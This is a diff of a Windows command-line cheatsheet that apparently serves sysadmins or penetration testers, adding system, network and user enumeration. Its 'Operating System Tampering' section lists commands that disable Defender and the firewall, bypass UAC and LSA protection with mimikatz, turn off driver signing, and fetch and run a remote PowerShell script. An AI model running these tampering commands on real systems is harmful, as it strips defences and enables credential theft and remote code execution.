@@ -4,25 +4,28 @@ title: Sysadmin CLI WIN
 category: Sysadmin
 parent: Sysadmin
 grand_parent: Cheatsheets
-modified_date: 2021-11-17
+modified_date: 2022-06-03
 permalink: /:categories/:title/
 ---
 <!-- vscode-markdown-toc -->
-* 1. [Security Checks](#SecurityChecks)
-	* 1.1. [configure ip address](#configureipaddress)
-	* 1.2. [listing kb](#listingkb)
-	* 1.3. [windows firewall status](#windowsfirewallstatus)
-	* 1.4. [windows defender status](#windowsdefenderstatus)
-* 2. [Operating System Tampering](#OperatingSystemTampering)
-	* 2.1. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
-	* 2.2. [windows defender: disable](#windowsdefender:disable)
-	* 2.3. [windows firewall: disable](#windowsfirewall:disable)
-	* 2.4. [windows uac: bypass](#windowsuac:bypass)
-	* 2.5. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
-	* 2.6. [Windows driver signature: disable](#Windowsdriversignature:disable)
-	* 2.7. [SMBv1: enable](#SMBv1:enable)
-* 3. [Windows DISM](#WindowsDISM)
-* 4. [Windows WSL manual distro install](#WindowsWSLmanualdistroinstall)
+* 1. [listing system config](#listingsystemconfig)
+	* 1.1. [listing OS and KB config](#listingOSandKBconfig)
+	* 1.2. [listing network config & shares](#listingnetworkconfigshares)
+	* 1.3. [listing users](#listingusers)
+* 2. [Security Checks](#SecurityChecks)
+	* 2.1. [windows firewall status](#windowsfirewallstatus)
+	* 2.2. [windows defender status](#windowsdefenderstatus)
+* 3. [Operating System Tampering](#OperatingSystemTampering)
+	* 3.1. [configure network ip address](#configurenetworkipaddress)
+	* 3.2. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
+	* 3.3. [windows defender: disable](#windowsdefender:disable)
+	* 3.4. [windows firewall: disable](#windowsfirewall:disable)
+	* 3.5. [windows uac: bypass](#windowsuac:bypass)
+	* 3.6. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
+	* 3.7. [Windows driver signature: disable](#Windowsdriversignature:disable)
+	* 3.8. [SMBv1: enable](#SMBv1:enable)
+* 4. [Windows DISM](#WindowsDISM)
+* 5. [Windows WSL manual distro install](#WindowsWSLmanualdistroinstall)
 
 <!-- vscode-markdown-toc-config
 	numbering=true
@@ -30,44 +33,82 @@ permalink: /:categories/:title/
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-##  1. <a name='SecurityChecks'></a>Security Checks
+##  1. <a name='listingsystemconfig'></a>listing system config
+###  1.1. <a name='listingOSandKBconfig'></a>listing OS and KB config
+```powershell
+# listing OS version
+wmic os list brief
 
-###  1.1. <a name='configureipaddress'></a>configure ip address
-```batch
-netsh
-interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
-```
-###  1.2. <a name='listingkb'></a>listing kb
-```batch
+# listing KB wmi
 wmic qfe list full /format:table
+
+# listing KB ps
+powershell -Command "systeminfo /FO CSV" | out-file C:\Windows\Temp\systeminfo.csv
+import-csv C:\Windows\Temp\systeminfo.csv | ForEach-Object{$_."Correctif(s)"}
 ```
 
-###  1.3. <a name='windowsfirewallstatus'></a>windows firewall status
+###  1.2. <a name='listingnetworkconfigshares'></a>listing network config & shares
+```powershell
+# listing network hardware
+wmic nic list brief
+ipconfig /all
+
+# listing network software 
+ipconfig /all
+route -n
+netstat -ano
+
+# listing network shares
+wmic netuse list brief
+net use
+
+wmic share
+net share
+```
+
+###  1.3. <a name='listingusers'></a>listing users
+```powershell
+# listing local users
+wmic netlogin list brief
+net user
+net localgroup
+net localgroup Administrators
+```
+
+##  2. <a name='SecurityChecks'></a>Security Checks
+
+###  2.1. <a name='windowsfirewallstatus'></a>windows firewall status
 ```batch
 # logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
 netsh advfirewall show allprofiles
 ```
 
-###  1.4. <a name='windowsdefenderstatus'></a>windows defender status
+###  2.2. <a name='windowsdefenderstatus'></a>windows defender status
 ```batch
 powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
 ```
 
-##  2. <a name='OperatingSystemTampering'></a>Operating System Tampering
+##  3. <a name='OperatingSystemTampering'></a>Operating System Tampering
 
-###  2.1. <a name='donwloadpsactivedirectorymodule'></a>donwload ps activedirectory module 
+###  3.1. <a name='configurenetworkipaddress'></a>configure network ip address
+```batch
+netsh
+interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
+```
+
+###  3.2. <a name='donwloadpsactivedirectorymodule'></a>donwload ps activedirectory module 
 ```batch
 #version 1
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
 
-###  2.2. <a name='windowsdefender:disable'></a>windows defender: disable
+###  3.3. <a name='windowsdefender:disable'></a>windows defender: disable
 ```batch
 powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 
-###  2.3. <a name='windowsfirewall:disable'></a>windows firewall: disable
+###  3.4. <a name='windowsfirewall:disable'></a>windows firewall: disable
 ```batch
 netsh advfirewall set publicprofile state off
 netsh advfirewall set privateprofile state off
@@ -75,25 +116,25 @@ netsh advfirewall set domainprofile state off
 netsh advfirewall set allprofiles state off
 ```
 
-###  2.4. <a name='windowsuac:bypass'></a>windows uac: bypass
+###  3.5. <a name='windowsuac:bypass'></a>windows uac: bypass
 ```batch
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
 ```
 
-###  2.5. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
+###  3.6. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
 ```batch
 powershell .\ConsoleApplication1.exe/InstallDriver
 powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
 powershell .\mimikatz.exe
 ```
 
-###  2.6. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
+###  3.7. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
 ```batch
 bcdedit.exe /set nointegritychecks on
 bcdedit.exe /set testsigning on
 ```
 
-###  2.7. <a name='SMBv1:enable'></a>SMBv1: enable
+###  3.8. <a name='SMBv1:enable'></a>SMBv1: enable
 ```batch
 DISM /online /enable-feature /featurename:SMB1Protocol
 DISM /online /enable-feature /featurename:SMB1Protocol-Client
@@ -101,7 +142,7 @@ DISM /online /enable-feature /featurename:SMB1Protocol-Server
 DISM /online /enable-feature /featurename:SMB1Protocol-Deprecation
 ```
 
-##  3. <a name='WindowsDISM'></a>Windows DISM
+##  4. <a name='WindowsDISM'></a>Windows DISM
 ```batch
 # Pre requisites: Admin rights
 # get all windows feature and save to a txt file
@@ -119,7 +160,7 @@ get-windowsoptionalfeature -online -featurename SMB1Protocol*
 get-windowsoptionalfeature -online -featurename SMB1Protocol* |ft
 ```
 
-##  4. <a name='WindowsWSLmanualdistroinstall'></a>Windows WSL manual distro install
+##  5. <a name='WindowsWSLmanualdistroinstall'></a>Windows WSL manual distro install
 ```
 # Note: By pass the GPO blocking the exec of the App Store app
 
